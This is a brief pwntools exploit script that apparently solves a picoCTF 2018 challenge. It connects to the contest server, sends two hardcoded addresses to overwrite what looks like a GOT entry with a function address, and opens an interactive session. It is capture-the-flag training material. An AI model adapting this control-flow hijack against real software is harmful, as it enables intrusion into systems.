from pwn import *

def handle_logic():
	r.recvuntil("lue?")
	r.sendline("804a00c")
	r.recvuntil("\n")
	r.sendline("804854b")

if __name__ == "__main__":
	r = remote("2018shell1.picoctf.com", 3582)
	#r = process(['./vuln'])
	handle_logic()
	r.interactive()